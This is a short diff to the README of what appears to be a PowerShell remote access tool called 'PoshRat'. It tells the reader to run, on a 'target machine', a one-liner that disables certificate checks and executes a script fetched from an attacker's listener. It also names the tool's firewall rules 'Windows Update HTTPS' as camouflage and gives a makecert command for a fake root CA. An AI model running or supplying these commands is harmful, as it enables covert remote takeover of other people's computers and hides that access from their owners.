@@ -11,7 +11,10 @@ On the target machine execute the below command from PowerShell:
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 iex (New-Object Net.WebClient).DownloadString("https://ListenerIPAddress:Port/connect")
 
-The listener opens incoming traffic on the specified port. The firewall rules are named "Windows Update HTTPS".
+The listener opens incoming traffic on the specified port. The listener needs to be run from
+an elevated PowerShell session.
+
+The firewall rules are named "Windows Update HTTPS".
 
 A Base64 encoded script is hardcoded in the script, you can use the below commands for generating a certificate.
 makecert.exe -sr localmachine -ss MY -a sha1 -n "CN=PoshRat Root CA" -sky signature -pe -r "Root.cer" -sv "RootKey.pvk"
